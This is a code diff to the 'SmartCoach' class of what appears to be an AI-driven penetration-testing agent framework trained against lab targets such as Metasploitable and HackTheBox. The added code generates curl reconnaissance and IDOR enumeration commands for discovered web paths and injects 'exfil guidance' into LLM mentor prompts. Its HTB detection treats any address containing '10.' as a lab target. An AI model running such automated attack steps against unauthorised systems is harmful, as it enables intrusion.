+    def _get_blue_agent_command(self, ctx: AttackContext) -> Optional[SmartDecisionResult]:
         """
         BlueAgent gets custom defensive commands - different from attack commands.
         Avoids commands used by other agents this step.
@@ -3987,7 +4195,7 @@ class SmartCoach:
                     if _flag.startswith("port_"):
                         try:
                             _pnum = int(_flag.replace("port_", ""))
-                            _svc_entries = kr.by_port(_pnum, limit=3)
+                            _svc_entries = kr.by_port(_pnum, max_results=3)
                             for _se in _svc_entries:
                                 if hasattr(_se, "commands") and _se.commands:
                                     _kb_suggestions.update(_se.commands[:2])
@@ -4414,7 +4622,7 @@ class SmartCoach:
             "strategic": "🎯",
             "stealth": "👤",
         }
-        return emojis.get(self.agent_role.get("role"), "🤖")
+        return emojis.get(str(self.agent_role.get("role", "")), "🤖")
     
     def clear_step_commands(self):
         """Clear used commands at start of new step (called by orchestrator)."""
@@ -4700,6 +4908,96 @@ class SmartCoach:
 
         return None
 
+    def _web_path_followup(
+        self,
+        step_ctx: "SmartStepContext",
+        discovery_board: Dict[str, Any],
+    ) -> Optional["SmartDecisionResult"]:
+        """Inject follow-up commands for discovered web paths.
+        
+        When ffuf/gobuster/feroxbuster discovers web paths (e.g. /data),
+        this method generates curl commands to explore those paths and
+        check for IDOR patterns (e.g. /data/0, /data/1).
+        
+        Only fires for ScoutAgent and RedAgent roles. Tracks which
+        paths have been followed up to avoid repeats.
+        """
+        # agent_role is a dict like {"role": "offensive", ...} — extract the role string
+        _role_str = self.agent_role.get("role", "") if isinstance(self.agent_role, dict) else self.agent_role
+        if _role_str not in ("recon", "offensive"):
+            return None
+        
+        web_paths = discovery_board.get("web_paths", set())
+        if not web_paths:
+            logger.debug(
+                f"[WEB_FOLLOWUP][{self.agent_name}] No web_paths in board. "
+                f"keys={list(discovery_board.keys())} wp={discovery_board.get('web_paths', 'MISSING')}"
+            )
+            return None
+        
+        target = discovery_board.get("target", getattr(step_ctx.attack_context, "target", ""))
+        if not target:
+            return None
+        
+        # Track which paths have been followed up
+        if not hasattr(self, '_explored_web_paths'):
+            self._explored_web_paths = set()
+        if not hasattr(self, '_explored_web_path_ids'):
+            self._explored_web_path_ids = set()
+        
+        ctx = step_ctx.attack_context
+        current_phase = ctx.current_phase if ctx else None
+        
+        # Find unexplored paths
+        for path in sorted(web_paths):
+            path_clean = str(path).strip("/")
+            if not path_clean or path_clean in (".", "..", "index.html", "index.php"):
+                continue
+            
+            # First: explore the path itself
+            if path_clean not in self._explored_web_paths:
+                self._explored_web_paths.add(path_clean)
+                cmd = f"curl -sL http://{target}/{path_clean} | head -200"
+                self._step_reasoning_log.append({
+                    "event": "web_followup",
+                    "detail": f"Following up on discovered path /{path_clean}",
+                })
+                return SmartDecisionResult(
+                    command=cmd,
+                    source="web_followup",
+                    confidence=0.85,
+                    template_name="curl_web_path",
+                    params={"target": target, "path": path_clean},
+                    reasoning=f"[WEB_FOLLOWUP] Exploring discovered path /{path_clean}",
+                    phase=current_phase,
+                    mentor_call=False,
+                )
+            
+            # Second: try IDOR enumeration on the path
+            if path_clean not in self._explored_web_path_ids:
+                self._explored_web_path_ids.add(path_clean)
+                cmd = (
+                    f"for i in $(seq 0 5); do echo \"=== /{path_clean}/$i ===\"; "
+                    f"curl -sL http://{target}/{path_clean}/$i -o /dev/null "
+                    f"-w 'Status: %{{http_code}} Size: %{{size_download}}\\n'; done"
+                )
+                self._step_reasoning_log.append({
+                    "event": "web_followup_ids",
+                    "detail": f"IDOR enumeration on /{path_clean}/0-5",
+                })
+                return SmartDecisionResult(
+                    command=cmd,
+                    source="web_followup",
+                    confidence=0.80,
+                    template_name="curl_web_path_ids",
+                    params={"target": target, "path": path_clean},
+                    reasoning=f"[WEB_FOLLOWUP] IDOR enumeration /{path_clean}/0-5",
+                    phase=current_phase,
+                    mentor_call=False,
+                )
+        
+        return None
+
     def _playbook_suggest(
         self,
         step_ctx: "SmartStepContext",
@@ -4720,12 +5018,18 @@ class SmartCoach:
             SmartDecisionResult if playbook has a suggestion, else None.
         """
         # R66: Scan randomizer override for first 2 RECON steps
+        # Disabled for HTB targets — scan randomizer sets template_name="scan_randomizer"
+        # which breaks playbook dependency chains (downstream steps never see
+        # "nmap_quick_scan" as completed → ffuf_fuzz/gobuster_dir never fire).
         ctx = step_ctx.attack_context
+        _is_htb_target = (ctx and ctx.target and '10.' in ctx.target
+                          and '172.28.' not in ctx.target)
         if (ctx and ctx.current_phase == AttackPhase.RECON
                 and step_ctx.step < 2
+                and not _is_htb_target
                 and hasattr(ctx, '_r66_scan_hints')
-                and ctx._r66_scan_hints):
-            _hints = ctx._r66_scan_hints
+                and getattr(ctx, '_r66_scan_hints', None)):
+            _hints = getattr(ctx, '_r66_scan_hints')
             _idx = step_ctx.step
             if _idx < len(_hints):
                 _cmd = _hints[_idx]
@@ -4735,6 +5039,7 @@ class SmartCoach:
                     confidence=0.85,
                     template_name="scan_randomizer",
                     params={"target": ctx.target},
+                    mentor_call=False,
                     reasoning=f"[R66 ScanRandomizer] Varied initial scan step {_idx}",
                     phase=ctx.current_phase,
                 )
@@ -4754,7 +5059,12 @@ class SmartCoach:
         # PPO has enough training now to drive most decisions
         base_prob = max(0.10, 0.60 - episode * 0.03)
         perf = self._get_curriculum_performance()
-        if perf > 0.7:
+        # HTB/live targets: high playbook prob to ensure kill chain completion
+        _is_htb = (ctx and ctx.target and '10.' in ctx.target
+                   and '172.28.' not in ctx.target)
+        if _is_htb:
+            playbook_prob = max(0.85, base_prob)  # 85%+ for HTB reliability
+        elif perf > 0.7:
             # Agent doing well — anneal faster, less hand-holding
             playbook_prob = max(0.10, base_prob * 0.4)
         elif perf < 0.3:
@@ -4768,18 +5078,29 @@ class SmartCoach:
         # Get playbooks for target profile
         # Map generic difficulty labels to actual target profiles
         target_profile = getattr(ctx, 'difficulty', 'generic') or 'generic'
-        if target_profile in ("medium", "easy", "hard"):
+        target_ip = getattr(ctx, 'target', '')
+        if target_profile in ("medium", "easy", "hard", "normal", "unknown"):
             # Detect target by IP: MS2=172.28.0.10, MS3=172.28.0.11
-            target_ip = getattr(ctx, 'target', '')
             if target_ip == '172.28.0.11' or target_ip.startswith('192.168.56.10'):
                 target_profile = "metasploitable3"
             elif target_ip == '172.28.0.10' or target_ip.startswith('192.168.56.10'):
                 target_profile = "metasploitable2"
             elif target_ip and '172.28.0' in target_ip:
                 target_profile = "metasploitable3"  # Default pentest-net = MS3
+            elif target_ip and '10.' in target_ip and '172.28.' not in target_ip:
+                # HTB / external target (10.x.x.x range = HTB VPN)
+                target_profile = "htb_easy"
             else:
                 target_profile = "generic"
         playbooks = get_playbooks_for_target(target_profile)
+        # Also include generic playbooks if HTB-specific ones found
+        if target_profile == "htb_easy":
+            from core.knowledge.pentesting_playbooks import get_playbooks_for_target as _gpft
+            generic_pbs = _gpft("generic")
+            seen = {pb.name for pb in playbooks}
+            for gpb in generic_pbs:
+                if gpb.name not in seen:
+                    playbooks.append(gpb)
         if not playbooks:
             playbooks = get_playbooks_for_target("generic")
         if not playbooks:
@@ -4849,6 +5170,19 @@ class SmartCoach:
             template = COMMAND_REGISTRY.get(matched_step.command)
             if not template:
                 continue
+
+            # HTB/Live fix: Enforce preconditions — skip playbook steps whose
+            # preconditions aren't met (e.g., sudo_check requires shell_obtained)
+            if template.preconditions:
+                _flags = ctx.state_flags if ctx else {}
+                _unmet = [p for p in template.preconditions if not _flags.get(p)]
+                if _unmet:
+                    logger.debug(
+                        f"[PLAYBOOK-PRECOND-SKIP] {self.agent_name}: Skipping "
+                        f"{matched_step.command} — unmet preconditions: {_unmet}"
+                    )
+                    completed_set.add(matched_step.command)
+                    continue
 
             # Phase 7.2: Skip credential-search playbook steps when creds are known
             if (ctx.state_flags.get("credentials_known") and
@@ -5649,7 +5983,7 @@ class SmartCoach:
                         f"[{t.get('_r69_template', '?')}] r={t.get('reward', 0):.1f}"
                         for t in (self._ppo_trajectory or [])[-20:]
                     )
-                    skills = self._postmortem_extractor.extract_skills(
+                    skills = self._postmortem_extractor.extract_skills(  # type: ignore[attr-defined]
                         transcript=transcript,
                         total_reward=total_ep_reward,
                         highest_phase=highest_phase or "RECON",
@@ -5699,7 +6033,7 @@ class SmartCoach:
         # Phase 6.2: Inject exfil guidance into context if provided
         if exfil_prompt:
             # Temporarily augment the context narrative for the mentor call
-            ctx._exfil_injection = exfil_prompt
+            setattr(ctx, '_exfil_injection', exfil_prompt)
         
         try:
             # === USE DUAL MENTOR IF AVAILABLE ===
@@ -5707,11 +6041,11 @@ class SmartCoach:
                 # Phase 11.0: Check Venice budget before dual-mentor call
                 if self.budget_controller is not None and not self.budget_controller.can_call_venice():
                     logger.debug(f"[{self.agent_name}] Venice budget exhausted, falling back to single mentor")
-                    mentor_response = self.smart_mentor.get_command(ctx, filtered_commands)
+                    mentor_response = self.smart_mentor.get_command(ctx, filtered_commands)  # type: ignore[union-attr]
                     provider_used = "gpt"
                     tokens_used = getattr(mentor_response, 'tokens_used', 0)
                 else:
-                    dual_response = self.dual_mentor.get_command(ctx, filtered_commands)
+                    dual_response = self.dual_mentor.get_command(ctx, filtered_commands)  # type: ignore[union-attr]
                     mentor_response = dual_response.chosen
                     provider_used = dual_response.provider_used
                     tokens_used = dual_response.tokens_total
@@ -5726,7 +6060,7 @@ class SmartCoach:
                 logger.debug(f"[{self.agent_name}] DualMentor chose: {mentor_response.template_name} via {provider_used}")
             else:
                 # === SINGLE MENTOR FALLBACK ===
-                mentor_response = self.smart_mentor.get_command(ctx, filtered_commands)
+                mentor_response = self.smart_mentor.get_command(ctx, filtered_commands)  # type: ignore[union-attr]
                 provider_used = "gpt"
                 tokens_used = getattr(mentor_response, 'tokens_used', 0)
             
@@ -6028,7 +6362,8 @@ class SmartCoach:
         # If a tool doesn't exist on the target, it will NEVER work — don't keep trying.
         if raw_output:
             _out_lower = raw_output.lower().strip()
-            if "not found" in _out_lower or "command not found" in _out_lower:
+            if ("not found" in _out_lower or "command not found" in _out_lower
+                    or "could not open" in _out_lower):
                 # Extract the tool name (first word of command)
                 _tool = decision.command.split()[0] if decision.command else ""
                 if _tool and not hasattr(self, '_failed_tools'):
@@ -6036,7 +6371,7 @@ class SmartCoach:
                 if _tool:
                     self._failed_tools.add(_tool)
                     logger.debug(
-                        f"[{self.agent_name}] Tool '{_tool}' not found on target — "
+                        f"[{self.agent_name}] Tool '{_tool}' failed — "
                         f"masked from future PPO selection"
                     )
         
@@ -6061,11 +6396,12 @@ class SmartCoach:
             try:
                 state_desc = f"Phase: {decision.phase}, discoveries: {len(new_discoveries or {})}"
                 available = [
-                    t.name for t in self._get_phase_commands(
+                    t.name for t in get_valid_commands_for_state(
+                        self.attack_context.state_flags if self.attack_context else {},
                         self.attack_context.current_phase if self.attack_context else None
                     )[:10]
-                ] if hasattr(self, '_get_phase_commands') else []
-                correction = self._dagger_corrector.get_correction(
+                ]
+                correction = self._dagger_corrector.get_correction(  # type: ignore[attr-defined]
                     state_description=state_desc,
                     ppo_action=decision.command[:100],
                     ppo_reward=breakdown.total,
@@ -6438,6 +6774,10 @@ class SmartCoach:
         # we skip sshpass alternatives in anti-repeat pool
         self._ssh_failures_this_episode: int = 0
         
+        # Web path follow-up: reset explored paths per episode
+        self._explored_web_paths: set = set()
+        self._explored_web_path_ids: set = set()
+        
         # Phase 8: Reset CognitionNode + PersonaRouter per episode
         self._cognition_result = None
         if self.cognition_node is not None:
@@ -6485,8 +6825,8 @@ class SmartCoach:
         }
         
         try:
-            os.makedirs(os.path.dirname(self.mentor_log_path), exist_ok=True)
-            with open(self.mentor_log_path, "a") as f:
+            os.makedirs(os.path.dirname(self.mentor_log_path or "logs/mentor.jsonl"), exist_ok=True)
+            with open(self.mentor_log_path or "logs/mentor.jsonl", "a") as f:
                 f.write(json.dumps(entry) + "\n")
         except Exception as e:
             logger.debug(f"Failed to log mentor call: {e}")
